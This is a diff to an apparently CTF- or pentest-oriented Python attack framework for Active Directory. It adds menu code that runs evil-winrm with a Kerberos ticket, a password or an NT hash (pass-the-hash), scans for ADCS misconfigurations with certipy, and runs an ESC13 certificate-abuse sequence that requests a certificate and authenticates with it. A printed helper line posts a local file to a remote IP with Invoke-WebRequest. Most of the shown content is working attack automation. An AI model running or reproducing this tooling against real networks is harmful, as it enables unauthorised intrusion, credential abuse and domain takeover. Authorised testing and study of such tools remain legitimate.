@@ -278,7 +278,7 @@ def privCheck():
       print("\n[+] " + ticket + "\n")
       ticket = ticket.rstrip(" ")
       if ticket != "":      
-         os.environ["KRB5CCNAME"] = f"{os.getcwd()}/{ticket}.ccache".rstrip(" ")
+         os.environ["KRB5CCNAME"] = f"{os.getcwd()}/{ticket}".rstrip(" ")
          print(os.environ["KRB5CCNAME"]) 
          print("")
          print(colored("[*] Checking ticket status for " + ticket + "...", colour3))
@@ -1410,7 +1410,7 @@ while True:
             COM = checkInterface("DNS", COM)
             networkSweep()
             checkBIOS()            
-         prompt()    
+      prompt()    
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2378,7 +2378,8 @@ while True:
                catsFile("exploit.tmp")
       else:
          print("[+] Unable to obtains shares...")
-      prompt()      
+      prompt()   
+         
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -3884,17 +3885,27 @@ while True:
          print("    -Command \"Invoke-WebRequest -Uri 'https://10.10.10.10/exploit.sh' -Method Post -InFile 'C:\\local\\exploit.sh' -ContentType 'application/octext-stream'\"")
          print("    -Command run 'REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD")
          localCOM("echo '" + Reset + "'")
-         if NTM[:5] != "EMPTY":
-            print("[i] Using the HASH value as a password credential...")
-            if IP46 == "-4":
-               remoteCOM("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
-            else:
-               remoteCOM("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
-         else:
-            if IP46 == "-4":
+         methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")     
+         SKEW = timeSync(SKEW)
+         print(colored("[*] Attempting to connect..", colour3))
+         if methodSelect[:1]=="1":
+            try:             
+               print("[i] Using ticket as credential...") 
+               remoteCOM("evil-winrm -i " + SDM.rstrip(" ") + " -r " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -k " + TGT.rstrip(" ") + " -s './" + powrDir + "/' -e './" + httpDir + "/'")
+            except:
+               print(f"[-] Failed to connect using ticket...")
+         if methodSelect[:1]=="2":
+            try:             
+               print("[i] Using password as credential...") 
                remoteCOM("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")            
-            else:
-               remoteCOM("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")
+            except:
+               print(f"[-] Failed to connect using password...")   
+         if methodSelect[:1]=="3":
+            try:             
+               print("[i] Using hash as credential...") 
+               remoteCOM("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
+            except:
+               print(f"[-] Failed to connect using hash...")                 
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -4564,6 +4575,7 @@ while True:
          prompt()
       else:
          pass 
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -4950,8 +4962,7 @@ while True:
       except Exception as e:
          print(f"[-] An unexpected error occurred: {e}")
       TIP = BAK
-      prompt() 
-      
+      prompt()       
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5035,12 +5046,27 @@ while True:
       if checkParam != 1:
          checkParam = test_DOM()               
       if checkParam != 1:
+         methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
          print(colored("[*] Checking ADCS misconfigurations...", colour3))  
          SKEW = timeSync(SKEW)       
-         if PAS[:2] != "''":      
-            remoteCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " -vulnerable -stdout") 
-         else:
-            remoteCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " -vulnerable -stdout") 
+         if methodSelect[:1]=="1":
+            try:             
+               print("[i] Using ticket as credential...")
+               remoteCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -target " + SDM.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " -vulnerable -stdout") 
+            except:
+               print(f"[-] Failed to check misconfigurations using ticket...")
+         if methodSelect[:1]=="2":
+            try: 
+               print("[i] Using password as credential...")            
+               remoteCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " -vulnerable -stdout") 
+            except:
+               print(f"[-] Failed to check misconfigurations using password...") 
+         if methodSelect[:1]=="3":
+            try: 
+               print("[i] Using hash as credential...")
+               remoteCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " -vulnerable -stdout") 
+            except:
+               print(f"[-] Failed to check misconfigurations using hash...")           
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -5267,13 +5293,17 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Certipy ESC13
+# Details : Menu option selected - Certipy ESC13 (Enroll for the TemporaryWinRM template via RPC)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='713':
-      print("[!] ESC13 - NDES Misconfiguration: Abusing the Network Device Enrollment Service to request certs via MSCEP with spoofed identities...\n") 
+      print("[!] ESC13 - NDES Misconfiguration: Abusing the Network Device Enrollment Service to request certs via MSCEP with spoofed identities...") 
+      getCert1 = input("[?] Please enter target certificate name: ")
       SKEW = timeSync(SKEW)
+      localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -target " + SDM.rstrip(" ") + " -dc-host " + SDM.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " -ca " + getCert1.rstrip(" ") + " -template TemporaryWinRM")
+      print(colored("\n[*] Fake enrolment created...", colour3))
+      localCOM("certipy auth -pfx " + USR.rstrip(" ") + ".pfx -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -username " + USR.rstrip() + " ")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
